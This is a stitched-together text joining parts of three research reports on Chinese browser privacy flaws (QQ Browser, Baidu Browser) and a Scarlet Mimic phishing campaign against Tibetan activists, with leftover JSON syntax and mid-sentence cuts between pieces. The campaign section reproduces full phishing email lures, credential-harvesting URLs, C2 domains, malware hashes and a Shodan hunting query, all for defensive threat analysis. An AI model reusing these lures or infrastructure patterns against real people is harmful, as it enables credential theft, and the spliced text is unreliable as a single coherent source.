U.S. Department of Justice after Apple’s tightening up of device security).  It is noteworthy, in this respect, that government signals intelligence practices as evidenced by what has appeared publicly (e.g., the Snowden disclosures) already make extensive use of the type of data leaked from applications that we document in these reports. Having this type of data collected and archived by private companies on servers inside mainland China and transiting through China-based networks would conveniently enable such signals intelligence collection practices for Chinese security agencies, and would likely be looked upon favourably by authorities.\n\nRegardless of which of the above is the answer, the effect is the same: the many millions of users of the applications we have studied are at risk of serious privacy and security compromises.\nQuestions for Tencent\nOn March 17, 2016, we sent a letter to Tencent with additional questions about the security vulnerabilities we identified. We sent the letter again on March 23, 2016. The letter is reproduced here.\n\nUpdate: Analysis of updated versions of QQ Browser\nWe notified Tencent of the security issues in QQ Browser on February 5, 2016.  To address these issues, on March 2, 2016, Tencent released version 6.4.2 of the Android version, and on or before March 14, 2016, Tencent released version 9.3.6872 of the Windows version.\nAnalysis of Android version 6.4.2\nOur analysis of version 6.4.2 of the Android version shows that some of our reported issues have been partially resolved and some remain unresolved.  The Android version now uses a 1024-bit RSA key instead of a 128-bit RSA key to encrypt session keys.  Moreover, session keys are now sampled from the entire 128-bit AES keyspace instead of being restricted to certain ASCII digits.  This greatly increases the strength of the encryption used to transmit sensitive data.  However, while a 1024-bit RSA key cannot be easily factored, we recommend using at least a 2048-bit key.  Moreover, due to their use of “plain RSA,” their implementation may still suffer from other vulnerabilities stemming from, for example, their lack of any key padding, such as OAEP.\nWe also found that the server now encrypts its responses using the session key instead of a hardcoded key.  This protects the server’s responses from being easily decrypted and injected, which makes any man-in-the-middle attack on QQ’s update process more difficult.  However, the strength of the encryption of these responses and their resistance to man-in-the-middle attacks also suffers from the caveats mentioned in the earlier paragraph.\nWe found that text typed into the address bar for searching or to go to a URL is still sent unencrypted.\nAnalysis of Windows version 9.3.6872\nOur analysis of version 9.3.6872 of the Windows version shows that some of the issues we reported have been resolved and some remain unresolved.  We found that all WUP requests sent by the Windows browser still use the same symmetric, easily decryptable algorithm.  However, among the five different WUP requests that we describe the Windows version as making in this report, we did not observe three (qbindexblacklist.testUrl, qbkpireportbak.stat, and login.login) in the latest version; however, we observed the browser still sending the other two (devicesniffer.DeviceSnifferHandle and qbpcstat.stat).  This means that almost all sensitive identifiers that we originally reported, including MAC addresses, hard drive serial numbers, and Windows user security identifiers are still being sent using symmetric cryptography that can be easily decrypted.\nWe also found that the URL for each page visited is still sent to http://masterconn.qq.com using the same easily decryptable encryption; however, now only the protocol and domain of each page visited are sent, not the full URL.\nSoftware updates are now checked via HTTPS instead of HTTP.  This secures users against both of the attacks on the Windows version’s update process that we describe in this report by preventing attackers from being able to perform man-in-the-middle attacks.\nAcknowledgments\nThe authors would like to thank Sarah McKune and Masashi Crete-Nishihata for assistance and peer review on this report. Jeffrey Knockel’s research for this project was supported by the Open Technology Fund’s Information Control Fellowship Program and Adam Senft’s research from the John D. and Catherine T. MacArthur Foundation (Ronald J. Deibert, Principal Investigator).\nFootnotes\n1It is notable that all of the locations from which we downloaded the clients used unencrypted HTTP connections, which presents another potential security concern.\n2China’s Counter-Terrorism Law, which came into effect on January 1, 2016, includes requirements for telecommunications operators and Internet service providers to “provide technical interfaces, decryption, and other technical support assistance to public security organs and state security organs conducting prevention and investigation of terrorist activities in accordance with law”. While the final text of the law appeared to back away from controversial requirements in earlier draft versions of the law, which required companies to provide backdoor access and submit encryption keys to authorities, the passed version of the law still requires companies to provide technical assistance and potentially decrypt user communications. While the precise definitions of what types of companies are included and what types of assistance they would be required to provide are still forthcoming, in all likelihood “a broad range of companies with an internet presence in China” will be included.\nAppendix\nWe have documented all correspondence with Tencent related to these security issues here:\n\n\n\nDate\nContact\n\n\nFebruary 5, 2016\nWe submitted a security disclosure to Tencent via their online disclosure mechanism at: http://en.security.tencent.com/.\n\n\nFebruary 16, 2016\nStatus of report changed to “confirmed,” comment is left thanking us for our report.\n\n\nFebruary 17, 2016\nWe inquire what steps will be taken to resolve the reported issues and what the timeline will be for their resolution.\n\n\nFebruary 21, 2016\nThey indicate that a new version fixing the vulnerabilities will be released in March.\n\n\nFebruary 24, 2016\nThey indicate that a new version fixing the vulnerabilities will be released “next week.”\n\n\nMarch 3, 2016\nThey ask for us to leave an address to send a bug bounty gift. (Their bug bounty is described on their security disclosure site as company swag such as “Tencent dolls”).\n\n\nMarch 8, 2016\nThey state that fixed versions have been released.\n\n\nMarch 10, 2016\nWe report our findings analyzing version 6.4.2 of the Android version. We also report that we could not find any changes in the Windows version and inquire whether we are analyzing the right version.\n\n\nMarch 14, 2016\nTencent responds providing a link to the latest Windows version saying that they have fixed a number of the issues we reported. They report that they have upgraded the update check to use HTTPS. In addition, they report that they will only send the domain of viewed pages instead of the full URL, as a means of judging if a website is malicious. They also mention that they will still send the GUID since it is not personally identifying.\n\n\nMarch 18, 2016\nWe respond confirming the changes in the Windows version and saying that we can still see other sensitive information in many WUP requests such as MAC addresses and hard drive serial numbers.\n\n\nMarch 20, 2016\nThey respond saying that they have tried their best to resolve all reported problems, and they inquire as to whether we have any new problems to report.\n\n\nMarch 22, 2016\nWe say that aside from the problems we have already reported we have no new issues to report. We say that we will be publishing our findings on March 28.\n\n\nMarch 22, 2016\nThey justify the collection of hard drive serial numbers by saying that “Hard drive serial number is use for identifying independent user, so that QQ Browser can offer personalized service.” They then inquire as to where we will be releasing our published findings.\n\n\nMarch 23, 2016\nWe say that we will release our findings on https://citizenlab.org/ . We also link to the letter that we sent to Tencent and ask if they know of an appropriate contact to answer the letter’s questions.\n\n\nMarch 24, 2016\nThey thank us for our feedback.\n\n\n\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tBy Jakub Dalek, Masashi Crete-Nishihata, and John Scott-Railton\nSummary\nThis report describes the latest iteration in a long-running espionage campaign against the Tibetan community.  We detail how the attackers continuously adapt their campaigns to their targets, shifting tactics from document-based malware to conventional phishing that draws on “inside” knowledge of community activities. This adaptation appears to track changes in security behaviors within the Tibetan community, which has been promoting a move from sharing attachments via e-mail to using cloud-based file sharing alternatives such as Google Drive.\nWe connect the attack group’s infrastructure and techniques to a group previously identified by Palo Alto Networks, which they named Scarlet Mimic. We provide further context on Scarlet Mimic’s targeting and tactics, and the intended victims of their attack campaigns.  In addition, while Scarlet Mimic may be conducting malware attacks using other infrastructure, we analyze how the attackers re-purposed a cluster of their malware Command and Control (C2) infrastructure to mount the recent phishing campaign.\nThis move is only the latest development in the ongoing cat and mouse game between attack groups like Scarlet Mimic and the Tibetan community. The speed and ease with which attackers continue to adapt highlights the challenges faced by Tibetans who are trying to remain safe online.\nBackground\nThe Tibetan community has been the target of malware-enabled espionage campaigns for over a decade. The attackers responsible for these campaigns are relentless in their attempts to compromise networks and harvest sensitive information. These attacks often demonstrate high levels of sophistication in the social engineering used to entice targets to open malicious attachments or links, but are typically not very technically advanced. A common technique is the use of document-based malware. In a recent four-year study on targeted malware attacks against civil society, which included six Tibetan groups, we found that document-based malware was the most common attack vector, accounting in some cases for up to 95 percent of all attacks against specific Tibetan groups.\nThe Tibetan community has recognized these patterns and made efforts to change user behaviors to mitigate the attacks. For example, groups have started a digital security training campaign called “Detach from Attachments”, which urges users to avoid sending or opening email attachments, and to use cloud-based storage (e.g., Google Drive) to send files instead. However, as the community changes behaviors, so do the attackers.\nRecently, Palo Alto Networks reported on a years-long espionage campaign they call “Scarlet Mimic” that targeted Tibetan and Uyghur groups (as well as government agencies in Russia and India). The Scarlet Mimic campaigns are a typical example of the attacks civil society faces. Carefully crafted email lures are sent to targets carrying exploits that leverage well-known vulnerabilities (e.g., CVE-2012-0158&lt, CVE-2010-3333), which we have seen used in campaigns against Tibetan groups frequently in recent years.\nIn this post, we show that servers used as malware C2 infrastructure by Scarlet Mimic are now hosting phishing pages designed to steal Google credentials from Tibetan activists and journalists. This shift in tactics from malware to phishing campaigns suggests that the attackers are adapting to behavioral changes in the Tibetan community. In the following sections, we provide an overview of malware campaigns connected to Scarlet Mimic we observed targeting Tibetan groups from 2013-2014, and analyze how the same infrastructure is now being used to host a wave of phishing attacks. We conclude with discussion of what may have motivated this change in tactics, and provide recommendations for targeted users.\nPart 1: Scarlet Mimic Campaigns against Tibetans\nAccording to Palo Alto Networks, Scarlet Mimic has been active for at least four years. The attack group primarily uses well-known vulnerabilities and the “FakeM” malware family first reported by Trend Micro in 2013, which attempts to disguise its malicious traffic as commonly used protocols.\nA cluster of Scarlet Mimic attacks used the FakeM Custom SSL variant and were deployed on C2 infrastructure that relied on free domains provided by Securepoint, a German dynamic DNS service. Dynamic DNS services typically allow anyone to make free subdomains from a main domain. In the case of Securepoint, this service allows anyone to make free subdomains from *.firewall-gateway.com, *.my-gateway.org, *.myfirewall.org and others.  We speculate that the attackers may have selected this particular service, because the domains have innocuous technical names (e.g, *.firewall-gateway.com) that may escape casual scrutiny. These kinds of domains can change ownership over time and may be shared by many unrelated users, which can also make analysis more challenging.\nOur analysis of attacks against the Tibetan community reveals a series of campaigns active from 2013 to 2014 using the FakeM Custom SSL variant and dynamic DNS infrastructure that is linked to Scarlet Mimic. These malware samples are described in detail in the Palo Alto Networks Scarlet Mimic report. Through our engagement with the targeted groups, we provide further context that demonstrates the level of social engineering and targeting put into the attacks. Understanding this context provides insights into the attackers’ tactics, including their later pivot to phishing campaigns.\nCampaign 1\nThe first attack that we connected to Scarlet Mimic was observed in a July 3, 2013 e-mail. The email was sent to the internal mailing list for a steering committee of a Tibetan NGO, and was highly customized.  The message spoofed the e-mail of the NGO’s director, and demonstrated familiarity with the internal workings of the organization. Under the pretext of an updated strategic plan, the e-mail encouraged recipients to open the attached document titled “[Organization Name] Updated Strategic Plan.doc”\nFrom: [Redacted]\nDate: 03 Jul 2013\nSubject: Re: [Steering Committee] conclusions to Strategic Plan Review\nTo: [Redacted]Dear Steering Committee Members, Thanks everyone for all of the good suggestions! Here is the Updated Strategic Plan and we’re looking forward to more comments please!\n[Redacted signature]\n\nThe malicious attachment installs the file pshvb.exe with the MD5 hash:\n8b83fc5d3a6a80281269f9e337fe3fff\nThis hash matches a FakeM Custom SSL variant sample described in the Palo Alto Networks report. The malware connected to a C2 server on the domain: news[.]firewall-gateway[.]com.  At the time of the attack this domain resolved to the IP address 109[.]169[.]77[.]230, and was hosted on UK-based virtual server provider iomart\nCampaign 2\nWe observed the attackers again on March 19, 2014 when they targeted a different Tibetan group. The attack masqueraded as a message from a representative of the Office of His Holiness the Dalai Lama (HHDL) in Taiwan and contained an attachment that referenced an upcoming visit of HHDL to Japan.\nSimilar to the previous attack, the attachment dropped the FakeM Custom SSL variant, and is also referenced in the Palo Alto Networks report. In this case the malware connected to the C2 detail43[.]myfirewall[.]org, which at the time of the attack also resolved to the same IP address as the previous campaign, 109[.]169[.]77[.]230.\nAnother set of attacks spanned from June to July 2014 targeting the same Tibetan group and a number of Tibetan journalists. The Tibetan group received multiple e-mails purportedly from NGOs working on Tibetan issues, while the journalists were enticed by a promise of survey results on Tibetan political attitudes.\nAll of these attacks used the same FakeM Custom SSL variant and connected to the C2 sys[.]firewall-gateway[.]net, which resolved to 95[.]154[.]195[.]159 at the time of the attack and was also hosted on UK server provider iomart. See Figure 1 for an overview of the campaign.\nFigure 1: Overview of Campaign 2, showing how the same malicious files are spread using different pretexts.\nPart 2: Old Infrastructure, New Tricks\nThroughout November 2015 we observed Scarlet Mimic’s C2 infrastructure being repurposed to host phishing attacks against the Tibetan community. The phishing campaign we identified consisted of targeted emails with email senders and messages that are relevant to the Tibetan community. The emails appeared to share links to documents or videos on Google Drive or video sharing websites.\nThe Phishing Campaign\nUsing the example of an e-mail sent to Tibetan journalists, we can demonstrate how a typical phishing attack in the campaign works. The e-mail masquerades as sent by a Tibetan activist, describes a video on China and Tibet, and shares a link to what appears to be a video sharing site.\nFrom: Dorjee Tenzin <tenzinsft@gmail.com>\nDate: 22 Nov 2015\nSubject: How CHINA takes care of Tibet and Tibetans – video\nTo: [Redacted]This video – How CHINA takes care of Tibet and Tibetans – is short and easy to understand. Must watch.\nhttp://www.downvids.net/how-china-takes-care-of-tibet-and-tibetans-595657.html\nIn fact, the link directs the user to a phishing page:\nhttp://accountgoogle[.]firewall-gateway[.]com/serviclogin\nThe site displays a lookalike to the Google Gmail login page (see Figure 2).\nFigure 2: Comparison of Google login phishing page (left) and authentic Google login as of March 2016 (right).\nInterestingly, the login page used by the attackers is slightly outdated. Their version includes both username and password prompts on the same page.  Google has been using a two-prompt process for authentication since May 2015\nIf a victim enters their credentials, the data is sent to the attackers via an HTTP POST request that is formatted as: http://accountgoogle.firewall-gateway.com/serviclogin/ojkiojr09[.]asp.  An example of the data that is sent back to attackers is provided in Figure 3.\nFigure 3: A sample of the data sent to the attackers. The Email and Password fields are the most relevant.\nDecoy Content\nOnce a user enters their credentials they are redirected to decoy content. In the example attack against Tibetan journalists, if the victim entered their credentials they were re-directed to the video “How CHINA takes care of Tibet and Tibetans” on the video sharing site referenced in the email (see Figure 4).\nFigure 4: Screenshot of destination content.\nThe destination content that the user is sent to is determined by a string in the subdirectory of the URL that has various misspellings of “servicelogin”. In the emails we collected, we found three subdirectory variations:\nhttp://filegoogle[.]firewall-gateway[.]com/servicelogin\nhttp://accountgoogle[.]firewall-gateway[.]com/serviclogin\nhttp://accountgoogle[.]firewall-gateway[.]com/servicclogin\nWe speculate that the last part of the URL, “ojkiojr09” in our example URL (http://accountgoogle.firewall-gateway.com/serviclogin/ojkiojr09[.]asp) may be a campaign code, or a way for the attackers to differentiate on their end who is accessing the phished page, and the destination content to which they should be forwarded. We see a similar string in another of the emails that may be used for this purpose: http://filegoogle[.]firewall-gateway[.]com/servicelogin/sfwef[.]asp\nPhishing Campaign Timeline\nWe have observed the campaign active between at least November 9, 2015 to December 18, 2015. During this period we collected three phishing emails sent to Tibetan journalists and NGOs. Monitoring the URLs that link to the phishing page reveals that the destination content to which the user would be forwarded was changed frequently. These changes suggest that the campaign was active beyond the three emails we collected and the attackers were sending out additional emails with messages linked to the new destination content.\nFigure 5 provides a timeline for the campaign and shows when emails were received, the original destination content provided, and changes to the destination content over time. On December 18 the servers were up, but no content was being served in reply to logins.\nFigure 5: Timeline of phishing campaign (see Appendix A for full details).\nWhile we only collected three emails during the span of the campaign, changes in the destination content suggest the timing and theme of further phishing attacks. On November 25, 2015 the destination content on URLs 1 and 2 were both changed to climate change-related content.\nThe content redirected from URL 1 was changed to a public Google Drive folder that contained campaign materials on climate change from a Tibetan NGO. The content redirected from URL 2 was changed to a website used to organize the Global Climate March (globalclimatemarch.org), a demonstration to raise climate change awareness.\nThe climate change theme is significant. During this period Tibetan organizations were taking part in advocacy to raise awareness on climate change in Tibetan areas in anticipation of the United Nations Conference on Climate Change held in Paris, France from November 30 to December 12, 2015.\nSee Appendix A for details on each attack and destination content change.\nOverlap with Scarlet Mimic\nSimilar to the previous FakeM Custom SSL campaigns, the phishing pages used domains provided by Securepoint’s dynamic DNS service:\nfilegoogle[.]firewall-gateway[.]com\naccountgoogle[.]firewall-gateway[.]com\ndetail43[.]myfirewall[.]org\nSimilar to the previous malware campaigns, all three of these domains are also hosted on iomart.\nWe observed the first phishing campaign using this infrastructure in early November 2015. During this time, two of the domains (filegoogle[.]firewall-gateway[.]com, accountgoogle[.]firewall-gateway[.]com) resolved to the IP address 95[.]154[.]195[.]171.\nWe further investigated this IP address through passive DNS data sources in PassiveTotal and found additional domains that match the “firewall-gateway” naming scheme  observed in the Scarlet Mimic malware campaigns:\naccountsgoogle[.]firewall-gateway[.]com\naccounts-google[.]firewall-gateway[.]com\naccountsgoogles[.]firewall-gateway[.]com\ngooglefile[.]firewall-gateway[.]net\nfirewallupdate[.]firewall-gateway[.]com\nfirewallupdate[.]firewall-gateway[.]net\ndrivgoogle[.]firewall-gateway[.]com\nTable 1 shows connections between domains identified by Palo Alto Networks, domains we see used as C2 servers in the previous malware campaigns, and relations to servers hosting the recent phishing campaigns. The overlap in domains and passive DNS records shows the infrastructure relationships between the previous Scarlet Mimic campaigns and recent phishing campaigns.\n\n    .tg  {border-collapse:collapse;border-spacing:0;}\n    .tg td{font-family:Arial, sans-serif;font-size:11px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;}\n    .tg th{font-family:Arial, sans-serif;font-size:11px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;\n        font-weight: bold;}\n    .tg .tg-yw4l{vertical-align:middle}\n\n\n\nASN Name\nIP Address\nDomain\nCitlab Seen\nFakeM Custom\n\n\nHOL-GR hellas online Electronic Communications S.A.,GR\n5.54.19.17\ndrivgoogle.firewall-gateway.com\nX\n\n\n\nIOMART-AS Iomart,GB\n78.129.252.159\nadmin.spdns.org\n\nX\n\n\nfirefox.spdns.de\n\nX\n\n\nintersecurity.firewall-gateway.com\n\nX\n\n\nkaspersky.firewall-gateway.net\n\nX\n\n\nkissecurity.firewall-gateway.net\n\nX\n\n\nopero.spdns.org\n\nX\n\n\n87.117.229.109\ndetail43.myfirewall.org\nX\nX\n\n\n95.154.195.171\naccountgoogle.firewall-gateway.com\nX\n\n\n\naccountsgoogle.firewall-gateway.com\nX\n\n\n\naccountsgoogles.firewall-gateway.net\nX\n\n\n\nfilegoogle.firewall-gateway.com\nX\n\n\n\nfirewallupdate.firewall-gateway.com\nX\n\n\n\nfirewallupdate.firewall-gateway.net\nX\nX\n\n\ngooglefile.firewall-gateway.net\nX\n\n\n\nnews.firewall-gateway.com\nX\nX\n\n\nsys.firewall-gateway.net\nX\nX\n\n\n109.169.40.172\neconomy.spdns.de\n\nX\n\n\nLGI-UPC Liberty Global Operations B.V.,AT\n46.127.56.109\nmail.firewall-gateway.com\n\nX\n\n\nNEWMEDIAEXPRESS-AS-AP NewMedia Express Pte Ltd.

The IP address 95[.]154[.]195[.]171 that we saw previously was using Microsoft IIS web server version 6 and was configured to forbid access to the top level of the URL path. Using the search engine Shodan we scanned all servers on iomart that ran IIS 6 and forbid access to the root url path with the query:\nport:80 IIS/6.0 forbidden title:Error \"Content-Length: 218\" country:\"GB\" org:iomart\nFor all the matched servers we sent a query to the URL path (/servicelogin/ojkiojr09.asp), which is used to redirect victims to destination content in the phish attacks. The purpose of this query was to to determine if any other servers would forward us to content in the same manner we had observed in the attacks.\nWe found one other IP address (87[.]117[.]229[.]109) on iomart that responded to this query. We observed this server responding with a redirect to an article by Radio Free Asia regarding the arrest of the aunt of Tenzin Delek Rinpoche, a Tibetan monk who recently died while in a Chinese prison.\nWe saw this content active from November 30, 2015 to December 3, 2015, when the forward link stopped working, which may mean that the campaign completed at this time.\nWe used PassiveTotal to identify which domains pointed to both IP addresses from March 2015 to December 2015 and saw an overlap across three domains:\nsys[.]firewall-gateway[.]net\nnews[.]firewall-gateway[.]com\nfirewallupdate[.]firewall-gateway[.]net \nThe domain: firewallupdate[.]firewall-gateway[.]net was referenced in the Palo Alto Network  report and pointed to both the IPs we identified at different times (see Figure 6).\nFigure 6: Domain overlap between two iomart IPs in the phishing infrastructure.\nAdditionally this new IP had two additional domains that were also using the Securepoint dynamic DNS service: updata[.]firewall-gateway[.]com and accounts-google[.]firewall-gateway[.]com. We saw one of the domains: detail43[.]myfirewall[.]org used as a C2 server for an attack in the previously described Scarlet Mimic campaign from 2014.\nWhy the Shift to Phishing?\nWhen Scarlet Mimic shifted tactics, they failed to properly compartmentalize their phishing and malware operations, relying on known C2 infrastructure for the new phishing campaigns. Although they tried different attack vectors they still fell back on old habits and resources that could be leveraged by analysts. Monitoring the infrastructure enabled us to track the campaigns over time and demonstrates the importance of infrastructure analysis for security researchers.\nThe shift to phishing campaigns is significant, as Palo Alto Networks only observed document-based malware attacks.[1] Importantly, Scarlet Mimic may be continuing to conduct as-yet unreported malware campaigns on other infrastructure. There are a number of potential explanations for this change.\nThe phishing campaigns targeted multiple organizations and individuals in the Tibetan community. Many of these groups act as distributed networks, with staff members and collaborators around the world. The attackers are, therefore, not necessarily targeting compromise of office networks, but rather social networks. Credential phishing is a potentially more efficient means of gaining access to these networks than document-based malware.\nIn addition, the promotion of behavioral changes in the Tibetan community and the use of document-sharing platforms such as Google Docs over email attachments may have put pressure on attackers’ tactics and led them to experiment with simpler, but potentially effective vectors, such as phishing. In other attacks against the Tibetan community over the past year we have also seen malware sent via Google Drive links in targeted emails. The Scarlet Mimic phishing campaigns add further evidence that attackers are attempting to leverage the wide use and trust of Google applications in the Tibetan community.\nIt is also possible that the rising detections by antivirus products of Scarlet Mimic’s preferred malware toolkit play a role. Out of the 74 FakeM sample hashes provided in the Palo Alto Networks Scarlet Mimic report, 61 are available on VirusTotal. When the samples were first submitted to VirusTotal some had zero detections and an overall average detection rate of 38 percent. Following the publication of the Palo Alto Networks report the average detection increased to 54 percent. The current average detection rate is 71 percent, the highest is 80 percent (46 / 57 antivirus scanners), and the lowest is 51 percent (23 / 45 antivirus scanners). These current detection rates may make the malware that the attackers used in past attacks less reliable for successful infection. While the attackers could be pivoting to new, less detectable malware, simple phishing attacks may also involve less effort and achieve higher success against journalists and NGO targets.\nFinally, we cannot rule out that converting burned or low-utility command and control servers to phishing might also be intentional down-cycling of infrastructure, before it is discarded.  Phishing, in other words, may be the last stop before domains and servers that are losing value are finally given up.\nConclusion\nThe Tibetan community has been targeted by sophisticated, persistent attackers for over a decade. Scarlet Mimic is just one of these attack groups, and over the years they have demonstrated deep familiarity and inside knowledge of the Tibetan groups they target. They have also shown themselves to be adaptable and responsive to changes in the security behaviors of their targets.\nTheir most recent turn to phishing seems to reflect this adaptability (although we leave open the possibility that malware attacks are continuing, using other infrastructure). A number of factors may have played a role in this transition, including an increase in certain security behaviors within the Tibetan community (such as not opening or sending attachments), and increasing rates of detection by antivirus products.\nThe information targeted by this group is sensitive, and in the hands of a well-resourced adversary, such as the sponsor of Scarlet Mimic, could cause harm to the safety and security of individuals in Tibet. The extracted information could also be used in support of efforts to frustrate and isolate political groups in the Tibetan diaspora.\nPhishing relies on tricking users into entering credentials. In this case, there are several telltale signs (such as a slightly outdated Gmail login phishing page) that may suggest to potential victims that something is “not quite right.” However, there are also a number of tools and tactics available to users in the Tibetan community and beyond to stay safe online We describe several of these below.\nWhat Can Targeted Users Do?\nTools\n\nUse two-factor authentication. This feature is available on many popular email and social network services including those from Google, Facebook, Microsoft, Yahoo, and others. Enabling two-factor authentication means you have to enter your password as well as a code provided by a text, app, or security key to access your account.  The second factor helps protect you from credential theft.\n\n\nPassword Alert [get it by clicking here] is a Chrome extension developed by Google that notifies you if you enter your Google credentials into any pages other than the real Google login page (https://accounts.google.com).\n\nBehavior\n\nAlways be cautious about emails containing links or attachments and carefully examine the email sender address in suspicious messages.\n\n\nIf an email contains a link always verify that the domain in the URL matches the link text.\n\n\nFor further resources on digital security see Tibet Action Institute’s Be a Cyber Super Hero project.\n\nFootnotes\n1.The one divergence from this pattern that has been previously reported was a 2013 Strategic Web Compromise (SWC) attack against the Tibetan Alliance of Chicago’s website documented by WebSense. A SWC is an attack in which attackers compromise normally trusted websites and serve malicious code to specific visitors. In this case, the attackers used the Tibetan website to serve an Internet Explorer vulnerability (CVE-2012-4969) that was patched in 2012. This attack used the domain mail[.]firewall-gateway[.]com as a C2, which is from the same dynamic DNS service as the FakeM SSL Custom variant attacks.\nAcknowledgements\nThis research was supported by the John D. and Catherine T.

The message purported to contain a link to a document with information on a controversial Buddhist sect known as Dorje Shugden or Dolgyal, which has been involved in protests against the Dalai Lama.\nFrom: Choephel Tenzin <tenzinch128@gmail.com>\nDate: Mon, Nov 9, 2015\nSubject: Who is demonstrating against the Dalai Lama\nTo: [Redacted] ​\nFile regarding Dolgyal.\nWho is demonstrating against the Dalai Lama.doc\nThe link “Who is demonstrating against the Dalai Lama.doc” actually goes to http://accountgoogle[.]firewall-gateway[.]com/servicclogin. When we first checked this link on November 13, the page was down and we therefore do not know what the original destination content was for this attack.\nDestination Content Switch\nOn November 25 the link was active and the destination content was a public Google Drive folder that contained campaign materials on climate change from a Tibetan NGO. The climate change theme is significant, as during this period Tibetan organizations were taking part in advocacy to raise awareness on climate change in Tibetan areas in anticipation of the United Nations Conference on Climate Change held in Paris, France from November 30 to December 12, 2015.\n\nPhishing Attack 2\nThe second phishing attack was sent to Tibetan journalists on November 22, 2015.\nIn this case the email was made to appear to come from a Tibetan activist, describes a video on China and Tibet, and shares a link to what appears to be a video sharing site, but is actually\nhttp://accountgoogle[.]firewall-gateway[.]com/serviclogin.\nFrom: Dorjee Tenzin <tenzinsft@gmail.com>\nDate: 22 Nov 2015\nSubject: How CHINA takes care of Tibet and Tibetans – video\nTo: [Redacted]\nThis video – How CHINA takes care of Tibet and Tibetans – is short and easy to understand. Must watch.\nhttp://www.downvids.net/how-china-takes-care-of-tibet-and-tibetans-595657.html\nOn November 22, 2015, if users entered their credentials into the Google login phishing page they would be redirected to the video described in the email.\n\nDestination Content Switch\nOn November 25, 2015, the destination content was changed to a website used to organize the Global Climate March (globalclimatemarch.org), a demonstration to raise climate change awareness around the United Nations Conference on Climate Change.\n\nThe November 25, 2015 destination content change shares the timing and theme of the change we observed on the previous URL path variation. While we do not have additional phishing emails from this period, these commonalities suggest the attackers were sending phishing emails with climate change themes around November 25, 2015.\nPhishing Attack 3\nOn November 23, 2015, an email appearing to be from the Press Officer of the Central Tibetan Administration was sent to multiple Tibetan journalists, activists, and NGO staff members.\nFrom: Tsering Wangchuk <euhrdesk.diir@gmail.com>\nDate: 23 Nov 2015\nSubject: Press Invitation\nTo: [Redacted]Press Invitation\nThe media is cordially invited by the Election Commission of the Central\nTibetan Administration its press conference regarding the upcoming Sikyong\nand Tibetan final elections at Lhakpa Tsering hall, DIIR, on November 27, 2015, at 10:00 AM.\nPress Invitation.pdfTsering Wangchuk\nPress Officer\n+91 8679208465\nwww.tibet.net\nTwitter: https://twitter.com/Pressofficerct\nFacebook: https://www.facebook.com/lhuabu\nDIIR, CENTRAL TIBETAN ADMINISTRATION\nThe “Press Invitation.pdf” link actually goes to http://filegoogle[.]firewall-gateway[.]com/servicelogin. On November 23, when the email was sent, if the user entered their credentials into the phishing page they would be redirected to a Google Doc containing a copy of an op-ed written by the Central Tibetan Administration on climate change. The destination content and the email message do not match in this case, which may be evidence of the attackers neglecting to switch out content from a previous campaign.\n\nDestination Content Switch\nOn November 26, 2015, the destination content to which the phishing page redirected users was changed to a Google Drive document that provides the program for a visit to Dharamsala, India by Chilean Parliamentarians.\n\nAppendix B: Indicators of Compromise\nScarlet Mimic Malware Campaign 1\nBinaries\nMD5: fef27f432e0ae8218143bc410fda340e\nCommand and Control Servers\nnews.firewall-gateway[.]com\nScarlet Mimic Malware Campaign 2\nAttack 1\nFile attachments\nFilename:20140317144336097.DOC\nMD5: 3b869c8e23d66ad0527882fc79ff7237\nBinaries\nFilename: cghnt.exe\nMD5: 1bf438b5744db73eea58379a3b9f30e5\nFilename: iph.bat\nMD5: d2e9412428c3bcf3ec98dba8a78adb7b\nCommand and Control Servers\ndetail43[.]myfirewall[.]org\n\nAttack 2\nFile attachments\nFilenames: Reappraisal_of_India_Tibet_Policy.doc\nGenuine autonomy or complete independance.doc\nApplication for Mentee.doc \nMD5: 7735e571d0450e2a31e97e4f8e0f66fa\nBinaries\nFilename: uroyh.exe\nMD5: ea45265fe98b25e719d5a9cc3b412d66\nFilename: uroyh-unpacked.exe \nMD5: 5c030802ad411fea059cc9cc4c118125\nCommand and Control Servers\nsys[.]firewall-gateway[.]net \nPhishing Campaign Infrastructure\nfilegoogle[.]firewall-gateway[.]com\naccountgoogle[.]firewall-gateway[.]com\ndetail43[.]myfirewall[.]org\n\nhttp://filegoogle[.]firewall-gateway[.]com/servicelogin\nhttp://accountgoogle[.]firewall-gateway[.]com/serviclogin\nhttp://accountgoogle[.]firewall-gateway[.]com/servicclogin\n\n\t\t\t\t\n\t\t\t",

The browser offers a number of features beyond those found in standard browsers, including video and audio download tools and built-in torrent support.\nThis report provides a detailed analysis of how Baidu Browser manages and transmits user data during its operation. The report identifies security concerns in both the Windows and Android versions of the browser that may expose personal user data, including a user’s geolocation, hardware identifiers, nearby wireless networks, web browsing data and search terms. Such user data is transmitted, in both the Windows and Android versions, unencrypted or with easily decryptable encryption, which means that any in-path actor could acquire this data by collecting the traffic and performing any necessary decryption. In addition, neither version of the application secures its software update process with a digital signature, which means that a malicious in-path actor could cause the browser to download and execute arbitrary code.\nThis report is a continuation of our prior work examining the security and privacy of popular mobile applications in Asia. Our previous research includes a report on similar concerns with UC Browser, a popular mobile web browser owned by China-based e-commerce giant Alibaba. That report documented UC Browser’s unencrypted transmission of sensitive user information, including IMSI, IMEI, Android ID, Wi-Fi MAC Address, geolocation data and user search queries. The security issues in UC Browser were identified in documents leaked by Edward Snowden that indicated the Five Eyes intelligence alliance, consisting of intelligence agencies from Canada, the United States, the United Kingdom, Australia and New Zealand, had used these vulnerabilities as a means of identifying users.\nIn previous work, we have analyzed the auto-update mechanisms in popular third party software. The remote code execution via man-in-the-middle attack vulnerabilities that we found in Baidu Browser’s auto-update mechanisms are consistent with vulnerabilities common in other third party software.\nIn addition, we have conducted research into keyword censorship and surveillance in TOM-Skype and keyword censorship in messaging platform Sina UC, as well as a comparative analysis of mobile chat applications popular in Asia, including WeChat, LINE and KakaoTalk.\nWe have also published an overview of privacy and security in mobile communications, entitled The Many Identifiers in Our Pockets. This primer on mobile technology identifiers is useful background for some of the technical issues raised in this report. Additionally, we have published, in collaboration with Open Effect, an analysis of privacy and security concerns in fitness trackers\nResponsible Disclosure and Notification\nOn November 26, 2015, we notified Baidu of our findings and our intent to publish this report. We indicated that we would not publish sooner than 45 days after notification, in line with international standards on vulnerability disclosure. Baidu initially stated that the issues we identified would be resolved in updates released by January 24, 2016. However, after Baidu identified that these security issues affected additional products, they requested we delay publication until after February 14, 2016. We agreed to not publish before February 14, 2016, in 